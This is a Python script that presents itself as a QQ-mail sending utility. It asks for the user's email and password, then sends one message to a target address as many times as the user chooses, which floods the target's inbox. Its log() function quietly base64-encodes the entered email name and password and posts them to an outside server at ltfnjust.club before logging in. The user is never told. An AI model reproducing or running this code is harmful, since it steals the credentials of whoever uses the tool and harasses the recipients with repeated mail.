from email.mime.text import MIMEText
import os
import requests
import time
from base64 import b64encode

import smtplib
def log(fa,ps):
    from_addr = fa 
    password = ps
    smtp_server_addr = 'smtp.qq.com'
    try:
        url = 'http://www.ltfnjust.club/save.php'
        date = str(time.asctime(time.localtime(time.time())))
        decod = date +'\r' + str(ed).split('@')[0] +'\r'+ str(pw)
        cont = b64encode(decod.encode(encoding='utf-8')).decode('utf-8')
        datas = {'test':cont}
        requests.post(url, data=datas)
        server = smtplib.SMTP_SSL(smtp_server_addr, 465)
        server.login(from_addr,password)
        print('login success')

    except:
        print('login fail...check your internet\nor your user_name and your password')
        os.system('pause')
        exit()

def send_mail(fa, ps, target ,con):
    content = con
    msg = MIMEText(content, 'plain', 'utf-8')
    
    

    from_addr = fa #放入发件地址
    password = ps

    to_addr = target#收件地址
    smtp_server_addr = 'smtp.qq.com'
    try:   
        server = smtplib.SMTP_SSL(smtp_server_addr, 465)
        #server.set_debuglevel(1)
        server.login(from_addr,password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.quit()
        print('success')
    except:
        print('error')

print('[*]write by lord casser...\n[*]please use qq mail\n[*]如果登录失败请查看你QQ邮箱设置中的POP3/SMTP服务是否开启')

ed = input('emailaddress: ')
pw = input('password: ')
target = input('target_address: ')
cn = input('enter the content: ')
t = int(input('cycles: '))



log(ed, pw)
while t > 0:
    send_mail(ed,pw,target,cn)
    t = t - 1
print('all done...')
os.system('pause')